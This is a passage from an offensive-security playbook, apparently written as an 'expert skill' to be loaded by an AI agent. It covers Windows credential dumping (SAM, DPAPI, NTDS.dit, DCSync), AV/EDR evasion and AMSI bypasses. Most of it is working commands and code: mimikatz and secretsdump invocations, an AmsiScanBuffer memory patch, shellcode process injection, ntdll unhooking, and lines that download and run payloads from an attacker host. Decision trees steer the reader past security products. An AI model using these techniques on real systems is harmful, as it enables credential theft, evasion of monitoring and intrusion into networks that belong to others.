copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

### Remote Extraction

```bash
# Impacket secretsdump (remote, in-memory)
secretsdump.py DOMAIN/administrator:password@TARGET_IP

# With hash
secretsdump.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP

# CrackMapExec
crackmapexec smb TARGET_IP -u administrator -p password --sam
crackmapexec smb TARGET_IP -u administrator -p password --lsa
```

### Offline Parsing

```bash
# Impacket secretsdump offline
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

# Extract local account hashes + cached domain creds + LSA secrets
```

---

## 3. DPAPI SECRETS

DPAPI protects browser passwords, Wi-Fi keys, credential manager entries, and more.

### Credential Manager

```cmd
# List stored credentials
cmdkey /list

# Mimikatz — dump DPAPI credentials
mimikatz # vault::cred
mimikatz # vault::list

# Decrypt DPAPI blobs
mimikatz # dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\{GUID}
```

### Master Key Extraction

```cmd
# Get user's DPAPI master keys
mimikatz # sekurlsa::dpapi

# Decrypt master key with domain backup key (requires DA)
mimikatz # lsadump::backupkeys /system:DC01.domain.com /export
mimikatz # dpapi::masterkey /in:masterkey_file /pvk:backup_key.pvk
```

### Browser Credentials

```bash
# SharpChromium (Chrome/Edge passwords)
SharpChromium.exe logins

# SharpDPAPI (comprehensive DPAPI extraction)
SharpDPAPI.exe triage
SharpDPAPI.exe credentials /server:DC01.domain.com   & REM Using domain backup key

# From Linux with Impacket
dpapi.py backupkeys -t DOMAIN/administrator:password@DC01
```

---

## 4. CACHED DOMAIN CREDENTIALS

Windows caches the last N domain logon credentials (default: 10).

```bash
# Impacket secretsdump extracts these automatically
secretsdump.py DOMAIN/admin:pass@TARGET -just-dc-user cachedcreds

# Format: $DCC2$10240#username#hash
# Crack with hashcat mode 2100
hashcat -m 2100 cached.txt wordlist.txt
```

```cmd
# Mimikatz
mimikatz # lsadump::cache

# Registry location
# HKLM\SECURITY\Cache
```

**Note**: DCC2 hashes are slow to crack (~50k/s on GPU vs millions for NTLM).

---

## 5. NTDS.DIT EXTRACTION (DOMAIN CONTROLLER)

### Method 1: ntdsutil (Built-in)

```cmd
# Create IFM (Install From Media) — includes NTDS.dit + SYSTEM
ntdsutil "ac i ntds" "ifm" "create full C:\temp\ifm" quit quit

# Extract from IFM
secretsdump.py -ntds C:\temp\ifm\Active\ Directory\ntds.dit \
  -system C:\temp\ifm\registry\SYSTEM LOCAL
```

### Method 2: Volume Shadow Copy

```cmd
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

### Method 3: DCSync (No File Access Needed)

```bash
# Full dump
secretsdump.py DOMAIN/admin:pass@DC01 -just-dc

# Specific user
secretsdump.py DOMAIN/admin:pass@DC01 -just-dc-user krbtgt

# With Kerberos auth
export KRB5CCNAME=admin.ccache
secretsdump.py -k -no-pass DC01.domain.com -just-dc
```

### Method 4: esentutl (Copy While in Use)

```cmd
esentutl.exe /y /vss C:\Windows\NTDS\ntds.dit /d C:\temp\ntds.dit
```

### Offline Parsing

```bash
# Full extraction
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

# With history (previous passwords)
secretsdump.py -ntds ntds.dit -system SYSTEM -history LOCAL

# Just NTLM hashes (for cracking)
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -outputfile domain_hashes
```

---

## 6. WINDOWS CREDENTIAL LOCATIONS SUMMARY

| Location | Contents | Extraction Tool |
|---|---|---|
| LSASS memory | NTLM hashes, Kerberos tickets, plaintext (WDigest) | Mimikatz, nanodump, lsassy |
| SAM hive | Local account NTLM hashes | reg save + secretsdump |
| SECURITY hive | LSA secrets, cached domain creds | reg save + secretsdump |
| SYSTEM hive | Boot key (needed to decrypt SAM) | reg save |
| NTDS.dit | All domain account hashes | ntdsutil, VSS, DCSync |
| DPAPI blobs | Browser passwords, Wi-Fi keys, cred manager | SharpDPAPI, Mimikatz |
| Credential Manager | Saved Windows credentials | cmdkey, Mimikatz |
| Group Policy Preferences | Legacy encrypted passwords (cpassword) | gpp-decrypt |
| Unattend.xml / sysprep | Setup passwords (base64) | Manual extraction |
| web.config / .config | Connection strings, API keys | Manual search |
| Registry autoruns | Service account passwords | reg query |

---

## 7. CREDENTIAL DUMP DECISION TREE

```
Need to extract credentials
│
├── Have local admin on target?
│   ├── LSASS dump (§1)
│   │   ├── EDR present? → nanodump or handlekatz (stealthy)
│   │   ├── No EDR → Mimikatz or comsvcs.dll (fastest)
│   │   └── Remote only → lsassy from Linux
│   │
│   ├── Local hashes → SAM/SYSTEM extraction (§2)
│   │   ├── Local → reg save
│   │   └── Remote → secretsdump.py or CrackMapExec --sam
│   │
│   └── DPAPI secrets → SharpDPAPI or Mimikatz (§3)
│
├── Have domain admin?
│   ├── DCSync → secretsdump.py (§5, easiest, no file access needed)
│   ├── NTDS.dit extraction → ntdsutil / VSS (§5)
│   └── Domain DPAPI backup key → decrypt all user DPAPI (§3)
│
├── Only have SMB file access (no admin)?
│   ├── Check for GPP passwords (cpassword in SYSVOL)
│   ├── Check for scripts with hardcoded creds
│   └── Check for unattend.xml / web.config files
│
└── Offline dump file (.dmp)?
    ├── LSASS dump → pypykatz / Mimikatz offline (§1)
    └── SAM+SYSTEM → secretsdump.py LOCAL (§2)
```


---

# Part 5: AV/EDR Evasion


# SKILL: AV/EDR Evasion — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert AV/EDR evasion techniques for Windows. Covers AMSI bypass, ETW bypass, .NET assembly loading, shellcode execution, process injection, unhooking, payload encryption, and signature evasion. Base models miss detection-specific bypass chains and syscall-level evasion nuances.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [windows-privilege-escalation](../windows-privilege-escalation/SKILL.md) when privesc tools are blocked by AV
- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) when lateral movement tools trigger EDR
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) when Rubeus/Mimikatz are detected
- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for non-binary AD attacks (less AV-sensitive)

### Advanced Reference

Also load [AMSI_BYPASS_TECHNIQUES.md](./AMSI_BYPASS_TECHNIQUES.md) when you need:
- Detailed AMSI bypass code patterns (memory patching, reflection)
- PowerShell-specific AMSI bypasses
- .NET AMSI bypass techniques


## 1. AMSI BYPASS OVERVIEW

AMSI (Antimalware Scan Interface) inspects PowerShell, .NET, VBScript, JScript, and Office macros at runtime.

### Key AMSI Bypass Categories

| Category | Method | Detection Risk | Persistence |
|---|---|---|---|
| Memory patching | Patch `AmsiScanBuffer` in `amsi.dll` | Medium | Per-process |
| Reflection | Modify AMSI init flags via .NET reflection | Medium | Per-session |
| String obfuscation | Encode/split AMSI trigger strings | Low | Per-payload |
| PowerShell downgrade | Force PS v2 (no AMSI) | Low | Per-session |
| CLM bypass | Escape Constrained Language Mode | Medium | Per-session |
| COM hijack | Redirect AMSI COM server | Low | Per-user |

### Quick AMSI Bypass (One-Liners)

```powershell
# PowerShell v2 downgrade (if .NET 2.0 available — no AMSI in v2)
powershell -Version 2

# Reflection-based (set amsiInitFailed = true)
# Obfuscated to avoid static detection — see AMSI_BYPASS_TECHNIQUES.md for full patterns
```

---

## 2. ETW BYPASS

ETW (Event Tracing for Windows) feeds telemetry to EDR. Patching `EtwEventWrite` stops .NET assembly load events.

### Patch EtwEventWrite

```csharp
// C# — patch EtwEventWrite to return immediately
var ntdll = GetModuleHandle("ntdll.dll");
var etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
// Write: ret (0xC3) to first byte
VirtualProtect(etwAddr, 1, 0x40, out uint oldProtect);
Marshal.WriteByte(etwAddr, 0xC3);
VirtualProtect(etwAddr, 1, oldProtect, out _);
```

### PowerShell ETW Bypass

```powershell
# Disable Script Block Logging (ETW provider)
[Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')
# Set internal field to disable ETW tracing
```

---

## 3. .NET ASSEMBLY LOADING

### In-Memory Assembly.Load

```csharp
byte[] assemblyBytes = File.ReadAllBytes("tool.exe");
// Or download from URL, decrypt from resource
Assembly assembly = Assembly.Load(assemblyBytes);
assembly.EntryPoint.Invoke(null, new object[] { args });
```

### Donut — Convert .NET Assembly to Shellcode

```bash
# Generate shellcode from .NET EXE
donut -f tool.exe -o payload.bin -a 2 -c ToolNamespace.Program -m Main

# With parameters
donut -f Rubeus.exe -o rubeus.bin -a 2 -p "kerberoast /outfile:tgs.txt"

# Then load shellcode via any injection technique (§5)
```

### execute-assembly (C2 Framework)

```
# Cobalt Strike
execute-assembly /path/to/Rubeus.exe kerberoast

# Sliver
execute-assembly /path/to/SharpHound.exe -c all

# Havoc
dotnet inline-execute /path/to/tool.exe args
```

---

## 4. SHELLCODE EXECUTION TECHNIQUES

### VirtualAlloc + Callback (Avoids CreateThread)

```csharp
IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
Marshal.Copy(sc, 0, addr, sc.Length);
// Use callback API instead of CreateThread (less monitored)
EnumWindows(addr, IntPtr.Zero);
```

**Callback APIs for shellcode execution**: `EnumWindows`, `EnumChildWindows`, `EnumFonts`, `EnumDesktops`, `CertEnumSystemStore`, `EnumDateFormats` — all accept function pointers that can point to shellcode.

---

## 5. PROCESS INJECTION TECHNIQUES

| Technique | APIs Used | Detection Risk | Notes |
|---|---|---|---|
| **CreateRemoteThread** | OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread | High | Classic, heavily monitored |
| **NtMapViewOfSection** | NtCreateSection, NtMapViewOfSection | Medium | Shared memory, less common |
| **Process Hollowing** | CreateProcess (SUSPENDED), NtUnmapViewOfSection, WriteProcessMemory, ResumeThread | Medium | Replace process image |
| **Thread Hijacking** | SuspendThread, SetThreadContext, ResumeThread | Medium | Modify existing thread |
| **Early Bird** | CreateProcess (SUSPENDED), QueueUserAPC, ResumeThread | Low-Medium | APC before main thread |
| **Phantom DLL Hollowing** | Map DLL section, overwrite with shellcode | Low | Uses legitimate DLL mapping |
| **Module Stomping** | LoadLibrary, overwrite .text section | Low | Backed by legitimate DLL |
| **Transacted Hollowing** | NtCreateTransaction, NtCreateSection | Low | No suspicious allocations |

### CreateRemoteThread (Basic Pattern)

```csharp
IntPtr hProcess = OpenProcess(0x001F0FFF, false, targetPid);
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
WriteProcessMemory(hProcess, addr, sc, (uint)sc.Length, out _);
CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
```

### Early Bird APC Injection

```csharp
// Create suspended process
STARTUPINFO si = new STARTUPINFO();
PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ..., ref si, ref pi);

// Allocate and write shellcode
IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
WriteProcessMemory(pi.hProcess, addr, sc, (uint)sc.Length, out _);

// Queue APC to main thread (runs before main entry point)
QueueUserAPC(addr, pi.hThread, IntPtr.Zero);
ResumeThread(pi.hThread);
```

---

## 6. UNHOOKING — BYPASS EDR API HOOKS

### Direct Syscalls (SysWhispers / HellsGate)

EDR hooks `ntdll.dll` functions. Direct syscalls bypass hooks by invoking the kernel directly.

```
Normal: User code → ntdll.dll (HOOKED) → kernel
Direct: User code → syscall instruction → kernel (bypasses hook)
```

| Tool | Method | Notes |
|---|---|---|
| **SysWhispers2/3** | Compile-time syscall stubs | Static syscall numbers |
| **HellsGate** | Runtime syscall number resolution | Dynamic, harder to detect |
| **HalosGate** | Resolve from neighboring unhooked syscalls | Handles partial hooks |
| **TartarusGate** | Extended HalosGate | More robust resolution |

### Fresh ntdll Copy

```csharp
// Read clean ntdll.dll from disk
byte[] cleanNtdll = File.ReadAllBytes(@"C:\Windows\System32\ntdll.dll");
// Or from KnownDlls: \KnownDlls\ntdll.dll
// Or from suspended process (create sacrificial process, read its ntdll)

// Overwrite hooked .text section with clean copy
// → All EDR hooks in ntdll are removed
```

### Indirect Syscalls

```
// Instead of: syscall (in your code — suspicious)
// Do: jump to syscall instruction inside ntdll.dll (legitimate location)
// The ret address on stack points to ntdll.dll, not your code
```

---

## 7. PAYLOAD ENCRYPTION & OBFUSCATION

### Encryption Methods

```csharp
// AES encryption (preferred)
using Aes aes = Aes.Create();
aes.Key = key; aes.IV = iv;
byte[] encrypted = aes.CreateEncryptor().TransformFinalBlock(shellcode, 0, shellcode.Length);

// XOR (simple, fast)
for (int i = 0; i < shellcode.Length; i++)
    shellcode[i] ^= key[i % key.Length];

// RC4 (stream cipher, simple implementation)
```

### Sleep Obfuscation

Encrypt shellcode in memory during sleep to avoid memory scanners.

| Technique | Method |
|---|---|
| **Ekko** | ROP chain → encrypt heap/stack during sleep |
| **Foliage** | APC-based sleep with memory encryption |
| **DeathSleep** | Thread de-registration during sleep |

### Staged Loading

```
Stage 1: Small, encrypted loader (evades static analysis)
Stage 2: Download actual payload at runtime (encrypted)
Stage 3: Decrypt in memory → execute
```

---

## 8. SIGNATURE EVASION

### String Encryption

```csharp
// Avoid plaintext API names, URLs, tool names
// Use encrypted strings, decrypt at runtime
string decrypted = Decrypt(encryptedApiName);
IntPtr funcPtr = GetProcAddress(GetModuleHandle("kernel32.dll"), decrypted);
```

### API Hashing

```csharp
// Resolve API by hash instead of name (avoids string detection)
// Hash "VirtualAlloc" → 0x91AFCA54
IntPtr func = GetProcAddressByHash(module, 0x91AFCA54);
```

### Metadata Removal

```bash
# Strip .NET metadata
ConfuserEx / .NET Reactor / Obfuscar

# Remove PE metadata (timestamps, rich header, debug info)
# Modify compilation timestamps
# Strip PDB paths
```

### C2 Framework Evasion

| Framework | Key Evasion Features |
|---|---|
| **Cobalt Strike** | Malleable C2 profiles, HTTP/S traffic shaping, sleep jitter, PE evasion |
| **Sliver** | Multiple protocols (mTLS, WireGuard, DNS), stager-less, built-in obfuscation |
| **Havoc** | Indirect syscalls, sleep obfuscation, module stomping |
| **Brute Ratel** | Badger agent, syscall evasion, ETW/AMSI bypass built-in |

---

## 9. AV/EDR EVASION DECISION TREE

```
Need to execute tool/payload on protected host
│
├── PowerShell-based payload?
│   ├── AMSI blocking? → AMSI bypass first (§1)
│   │   ├── .NET 2.0 available? → PS v2 downgrade (no AMSI)
│   │   ├── Memory patch AmsiScanBuffer
│   │   └── Reflection-based bypass
│   ├── Script Block Logging? → ETW bypass (§2)
│   └── Constrained Language Mode? → CLM bypass or switch to C#
│
├── .NET assembly (Rubeus, SharpHound, etc.)?
│   ├── Direct execution blocked?
│   │   ├── In-memory Assembly.Load (§3)
│   │   ├── Convert to shellcode with Donut (§3)
│   │   └── Use C2 execute-assembly (§3)
│   └── Still detected?
│       ├── Obfuscate assembly (ConfuserEx)
│       ├── Modify source + recompile
│       └── Use BOFs (Beacon Object Files) if CS
│
├── Shellcode execution needed?
│   ├── Basic → VirtualAlloc + callback (§4)
│   ├── Need injection → choose technique by OPSEC (§5)
│   │   ├── Low detection needed → module stomping or phantom DLL
│   │   ├── Medium → early bird APC or NtMapViewOfSection
│   │   └── Quick and dirty → CreateRemoteThread
│   └── Memory scanners detect payload?
│       ├── Encrypt payload → decrypt only at execution (§7)
│       └── Sleep obfuscation (Ekko/Foliage) (§7)
│
├── EDR hooking ntdll.dll?
│   ├── Direct syscalls (SysWhispers3/HellsGate) (§6)
│   ├── Fresh ntdll copy from disk/KnownDlls (§6)
│   └── Indirect syscalls (return to ntdll instruction) (§6)
│
├── Signature detection?
│   ├── Known tool signature → modify + recompile
│   ├── String-based → string encryption / API hashing (§8)
│   ├── PE metadata → strip/modify (§8)
│   └── Behavioral → change execution flow, add junk code
│
└── All local evasion fails?
    ├── Use Living-off-the-Land (LOLBins): certutil, mshta, regsvr32
    ├── Use legitimate admin tools (PsExec, WMI, WinRM)
    └── Switch to fileless / memory-only techniques
```


---

# Part 6: AMSI Bypass Techniques


## 1. AMSI ARCHITECTURE

```
PowerShell / .NET / VBScript / JScript
        │
        ▼
    amsi.dll (loaded in process)
        │
        ├── AmsiInitialize()    → Create AMSI context
        ├── AmsiOpenSession()   → Open scan session
        ├── AmsiScanBuffer()    → Scan content ← PRIMARY TARGET
        ├── AmsiScanString()    → Scan string
        └── AmsiCloseSession()  → Close session
        │
        ▼
    AV Engine (Windows Defender / third-party)
        │
        ▼
    AMSI_RESULT (Clean / Malware / Not Detected)
```

**Key insight**: Patching `AmsiScanBuffer` to always return "clean" bypasses all AMSI-enabled scanning.


## 2. MEMORY PATCHING — AmsiScanBuffer

### Concept

Overwrite the first bytes of `AmsiScanBuffer` so it returns `AMSI_RESULT_CLEAN` (0) immediately.

### PowerShell Implementation (Obfuscated)

```powershell
# Base pattern — variable names must be randomized per use
$a = [Ref].Assembly.GetTypes() | ? { $_.Name -like "*siUtils" }
$b = $a.GetFields('NonPublic,Static') | ? { $_.Name -like "*Context" }
# ... patching logic varies by implementation

# The actual patch writes bytes to AmsiScanBuffer:
# x64: mov eax, 0x80070057 (E_INVALIDARG); ret
# Bytes: B8 57 00 07 80 C3
```

### C# Implementation

```csharp
// Get amsi.dll handle and AmsiScanBuffer address
IntPtr amsiDll = LoadLibrary("amsi.dll");
IntPtr amsiScanBufferAddr = GetProcAddress(amsiDll, "AmsiScanBuffer");

// Change memory protection to writable
VirtualProtect(amsiScanBufferAddr, (UIntPtr)6, 0x40, out uint oldProtect);

// Patch: mov eax, 0x80070057; ret (returns E_INVALIDARG)
byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
Marshal.Copy(patch, 0, amsiScanBufferAddr, patch.Length);

// Restore protection
VirtualProtect(amsiScanBufferAddr, (UIntPtr)6, oldProtect, out _);
```

### Obfuscation Techniques for the Patch

```powershell
# Avoid string "AmsiScanBuffer" (itself flagged):

# XOR obfuscation
$xorKey = 0x42
$encBytes = [byte[]]@(0x23,0x2F,0x31,...) # XOR-encrypted function name

# Base64 split
$p1 = "Am"; $p2 = "si"; $p3 = "Sc"; $p4 = "anBuf"; $p5 = "fer"
$funcName = "$p1$p2$p3$p4$p5"

# Reverse string
$rev = "reffuBnacSimA"
$funcName = -join ($rev[-1..-($rev.Length)])
```

---

## 3. REFLECTION-BASED BYPASS

### Set amsiInitFailed

```powershell
# Force AMSI initialization failure via reflection
# The field name and class are obfuscated because they're flagged
$t = [Ref].Assembly.GetType(('System.Management.Automation.{0}' -f ('Am','siUtils' -join '')))
$f = $t.GetField(('am','siIn','itFailed' -join ''), 'NonPublic,Static')
$f.SetValue($null, $true)
# All subsequent AMSI scans skip (init "already failed")
```

### Disable AMSI via Session State

```powershell
# Remove AMSI providers from session
$utils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$field = $utils.GetField('amsiSession', 'NonPublic,Static')
$session = $field.GetValue($null)
# Nullify session → AMSI has no active session to scan with
```

---

## 4. POWERSHELL-SPECIFIC BYPASSES

### PowerShell v2 Downgrade

```cmd
# If .NET Framework 2.0/3.5 is installed, PS v2 has no AMSI
powershell -Version 2 -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"

# Check if v2 is available
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v2.0.50727"
```

### PowerShell Runspace (Bypass Script Block Logging + AMSI)

```csharp
// C# — create PowerShell runspace without AMSI
using System.Management.Automation;
using System.Management.Automation.Runspaces;

Runspace rs = RunspaceFactory.CreateRunspace();
rs.Open();
// Patch AMSI in this runspace
PowerShell ps = PowerShell.Create();
ps.Runspace = rs;
ps.AddScript("whoami");
var results = ps.Invoke();
```

### Constrained Language Mode Bypass

```powershell
# Check current language mode
$ExecutionContext.SessionState.LanguageMode

# Bypass 1: PowerShell v2 (no CLM in v2)
powershell -Version 2

# Bypass 2: Run from unmanaged code (C++/C# loader)
# CLM is enforced per-process; unmanaged loader can create unrestricted runspace

# Bypass 3: WDAC/AppLocker misconfiguration
# Find writable directory in allowed path → execute from there
```

---

## 5. .NET AMSI BYPASS

### In-Assembly Bypass (Before Tool Execution)

```csharp
// Patch AmsiScanBuffer before loading the target .NET tool
static void PatchAmsi()
{
    IntPtr lib = LoadLibrary("amsi.dll");
    IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");

    uint oldProtect;
    VirtualProtect(addr, (UIntPtr)6, 0x40, out oldProtect);

    // mov eax, 0x80070057 (E_INVALIDARG); ret
    Marshal.Copy(new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }, 0, addr, 6);

    VirtualProtect(addr, (UIntPtr)6, oldProtect, out _);
}

// Call PatchAmsi() before Assembly.Load() of the target tool
PatchAmsi();
byte[] toolBytes = DownloadAndDecrypt("https://attacker/tool.enc");
Assembly.Load(toolBytes).EntryPoint.Invoke(null, new object[] { args });
```

### VBScript/JScript AMSI Bypass

```vbscript
' VBScript — WScript.Shell execution (AMSI may not cover all code paths)
Set shell = CreateObject("WScript.Shell")
shell.Run "cmd.exe /c whoami", 0, True
```

### Office Macro AMSI Bypass

```vba
' VBA macros are scanned by AMSI in Office 365+
' Bypass: use Win32 API directly (VirtualAlloc + RtlMoveMemory + CreateThread)
' AMSI scans the VBA source, not the API calls at runtime

Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (...)
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (...)
Private Declare PtrSafe Function CreateThread Lib "kernel32" (...)
```

---

## 6. COM-BASED AMSI BYPASS

### AMSI COM Server Hijack

AMSI uses a COM object (CLSID `{fdb00e52-a214-4aa1-8fba-4357bb0072ec}`). Redirecting it disables AMSI.

```cmd
# Create registry redirect (per-user, no admin needed)
reg add "HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32" /ve /d "C:\temp\fake_amsi.dll" /f

# fake_amsi.dll exports AmsiScanBuffer returning S_OK + AMSI_RESULT_CLEAN
```

---

## 7. HARDWARE BREAKPOINT BYPASS

Use hardware breakpoints to intercept `AmsiScanBuffer` without modifying memory.

```csharp
// Set hardware breakpoint on AmsiScanBuffer
// When hit: exception handler modifies return value to AMSI_RESULT_CLEAN
// Advantage: no memory modification → bypasses integrity checks

CONTEXT ctx = new CONTEXT { ContextFlags = CONTEXT_DEBUG_REGISTERS };
ctx.Dr0 = (ulong)amsiScanBufferAddr;  // Break address
ctx.Dr7 = 0x00000001;                  // Enable DR0
SetThreadContext(hThread, ref ctx);

// Vectored Exception Handler modifies RAX (return value) to 0
AddVectoredExceptionHandler(1, ExceptionHandler);
```

**Advantage**: No code patching, passes memory integrity checks used by some EDRs.

---

## 8. AMSI BYPASS DECISION TREE

```
Need to bypass AMSI
│
├── PowerShell payload?
│   ├── .NET 2.0 available?
│   │   └── PS v2 downgrade (simplest, no AMSI in v2) (§4)
│   ├── Can run C# loader?
│   │   └── Patch AmsiScanBuffer from C# before PS (§2)
│   ├── Pure PowerShell bypass needed?
│   │   ├── Reflection: set amsiInitFailed (§3)
│   │   ├── Memory patch AmsiScanBuffer (§2)
│   │   └── Obfuscate all trigger strings
│   └── Bypass detected by AV?
│       ├── Hardware breakpoint method (§7)
│       └── COM server hijack (§6)
│
├── .NET assembly (C# tool)?
│   ├── AMSI scanning Assembly.Load?
│   │   ├── Patch AMSI before load (§5)
│   │   ├── ETW bypass to hide load event
│   │   └── Convert to shellcode via Donut (avoid .NET AMSI entirely)
│   └── CLM blocking execution?
│       ├── PS v2 downgrade (§4)
│       └── Unmanaged loader (C++/C# P/Invoke)
│
├── VBScript / JScript?
│   ├── AMSI scans script content → obfuscate heavily
│   └── Use WScript.Shell for execution (less AMSI coverage)
│
├── Office Macro?
│   ├── VBA AMSI bypass: use Win32 API directly (§5)
│   └── Obfuscate macro source code
│
├── Multiple AMSI bypasses chained?
│   └── 1. Obfuscate strings → 2. Patch AMSI → 3. Load payload
│       (each layer adds resilience)
│
└── EDR detects the bypass itself?
    ├── Vary bypass method per engagement
    ├── Use hardware breakpoints (no memory modification) (§7)
    ├── Custom-develop bypass (modify known patterns)
    └── Consider fileless Living-off-the-Land approach instead
```
